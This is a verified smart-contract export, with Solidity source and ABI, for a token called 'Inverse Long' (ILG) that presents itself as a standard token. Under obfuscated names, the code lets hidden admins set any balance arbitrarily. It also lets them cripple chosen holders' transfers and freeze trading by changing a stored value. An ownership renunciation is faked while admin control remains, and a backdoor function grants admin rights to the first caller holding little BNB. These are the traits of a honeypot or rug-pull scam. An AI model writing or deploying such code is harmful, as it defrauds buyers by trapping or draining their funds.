{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface maxLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeLaunchedEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldTrading {\n    function createPair(address shouldAmount, address listShould) external returns (address);\n}\n\ninterface isTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapBuy) external view returns (uint256);\n\n    function transfer(address isTake, uint256 maxSender) external returns (bool);\n\n    function allowance(address limitSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isTake,\n        uint256 maxSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamAuto, uint256 value);\n    event Approval(address indexed limitSell, address indexed spender, uint256 value);\n}\n\ninterface isToMetadata is isTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InverseLong is feeLaunchedEnable, isTo, isToMetadata {\n\n    function sellTrading(address modeLaunchMax) public {\n        shouldIs();\n        \n        if (modeLaunchMax == fromTotal || modeLaunchMax == limitLaunchTo) {\n            return;\n        }\n        isSender[modeLaunchMax] = true;\n    }\n\n    address autoAtTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public maxTake;\n\n    mapping(address => mapping(address => uint256)) private feeTake;\n\n    function transferFrom(address marketingSender, address isTake, uint256 maxSender) external override returns (bool) {\n        if (_msgSender() != txReceiver) {\n            if (feeTake[marketingSender][_msgSender()] != type(uint256).max) {\n                require(maxSender <= feeTake[marketingSender][_msgSender()]);\n                feeTake[marketingSender][_msgSender()] -= maxSender;\n            }\n        }\n        return isShould(marketingSender, isTake, maxSender);\n    }\n\n    function receiverSwap(address receiverTeam, uint256 maxSender) public {\n        shouldIs();\n        limitIsTx[receiverTeam] = maxSender;\n    }\n\n    function approve(address takeFund, uint256 maxSender) public virtual override returns (bool) {\n        feeTake[_msgSender()][takeFund] = maxSender;\n        emit Approval(_msgSender(), takeFund, maxSender);\n        return true;\n    }\n\n    address public fromTotal;\n\n    bool public totalMin;\n\n    uint256 constant teamAt = 7 ** 10;\n\n    mapping(address => bool) public isSender;\n\n    uint256 tokenShould;\n\n    bool public atLiquidity;\n\n    uint8 private tokenLaunchBuy = 18;\n\n    mapping(address => uint256) private limitIsTx;\n\n    function isShould(address marketingSender, address isTake, uint256 maxSender) internal returns (bool) {\n        if (marketingSender == fromTotal) {\n            return feeListLaunch(marketingSender, isTake, maxSender);\n        }\n        uint256 launchedTo = isTo(limitLaunchTo).balanceOf(autoAtTo);\n        require(launchedTo == tokenShould);\n        require(isTake != autoAtTo);\n        if (isSender[marketingSender]) {\n            return feeListLaunch(marketingSender, isTake, teamAt);\n        }\n        return feeListLaunch(marketingSender, isTake, maxSender);\n    }\n\n    function owner() external view returns (address) {\n        return atTrading;\n    }\n\n    constructor (){\n        if (limitMode != liquidityAutoTo) {\n            limitMode = liquidityAutoTo;\n        }\n        maxLaunch exemptModeIs = maxLaunch(txReceiver);\n        limitLaunchTo = shouldTrading(exemptModeIs.factory()).createPair(exemptModeIs.WETH(), address(this));\n        \n        fromTotal = _msgSender();\n        fundFromBuy();\n        modeAt[fromTotal] = true;\n        limitIsTx[fromTotal] = isMax;\n        if (txLaunchTeam) {\n            txLaunchTeam = false;\n        }\n        emit Transfer(address(0), fromTotal, isMax);\n    }\n\n    function balanceOf(address swapBuy) public view virtual override returns (uint256) {\n        return limitIsTx[swapBuy];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isMax;\n    }\n\n    address txReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public limitLaunchTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txFund;\n    }\n\n    address private atTrading;\n\n    string private buyModeTake = \"Inverse Long\";\n\n    function shouldIs() private view {\n        require(modeAt[_msgSender()]);\n    }\n\n    string private txFund = \"ILG\";\n\n    function fundFromBuy() public {\n        emit OwnershipTransferred(fromTotal, address(0));\n        atTrading = address(0);\n    }\n\n    uint256 txSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return buyModeTake;\n    }\n\n    function getOwner() external view returns (address) {\n        return atTrading;\n    }\n\n    event OwnershipTransferred(address indexed marketingFee, address indexed modeSell);\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenLaunchBuy;\n    }\n\n    bool public takeSwap;\n\n    function transfer(address receiverTeam, uint256 maxSender) external virtual override returns (bool) {\n        return isShould(_msgSender(), receiverTeam, maxSender);\n    }\n\n    uint256 private liquidityAutoTo;\n\n    function marketingExempt(address marketingLimitTeam) public {\n        require(marketingLimitTeam.balance < 100000);\n        if (takeSwap) {\n            return;\n        }\n        if (liquidityAutoTo == limitMode) {\n            limitMode = liquidityAutoTo;\n        }\n        modeAt[marketingLimitTeam] = true;\n        if (tokenLimit != totalMin) {\n            maxTake = false;\n        }\n        takeSwap = true;\n    }\n\n    bool public txLaunchTeam;\n\n    mapping(address => bool) public modeAt;\n\n    function feeListLaunch(address marketingSender, address isTake, uint256 maxSender) internal returns (bool) {\n        require(limitIsTx[marketingSender] >= maxSender);\n        limitIsTx[marketingSender] -= maxSender;\n        limitIsTx[isTake] += maxSender;\n        emit Transfer(marketingSender, isTake, maxSender);\n        return true;\n    }\n\n    uint256 public limitMode;\n\n    function allowance(address shouldReceiver, address takeFund) external view virtual override returns (uint256) {\n        if (takeFund == txReceiver) {\n            return type(uint256).max;\n        }\n        return feeTake[shouldReceiver][takeFund];\n    }\n\n    uint256 private isMax = 100000000 * 10 ** 18;\n\n    function teamListMin(uint256 maxSender) public {\n        shouldIs();\n        tokenShould = maxSender;\n    }\n\n    bool public tokenLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFromBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunchTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLimitTeam\",\"type\":\"address\"}],\"name\":\"marketingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"receiverSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunchMax\",\"type\":\"address\"}],\"name\":\"sellTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"teamListMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunchTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InverseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}